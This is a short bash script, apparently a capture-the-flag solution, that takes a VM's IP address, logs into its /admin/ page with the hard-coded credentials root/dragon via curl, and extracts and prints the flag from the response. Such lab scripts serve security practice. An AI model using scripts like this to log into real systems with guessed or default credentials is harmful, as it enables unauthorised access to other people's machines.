#!/bin/bash
echo input the VM ip address :
read ip

url="http://${ip}/admin/"

response=$(curl -s -F "username=root" -F "password=dragon" -F "Login=Login" "$url" | grep "flag")
response=$(cut -f3 -d ":" <<< $response | cut -c -65)
echo "FLAG:${response}"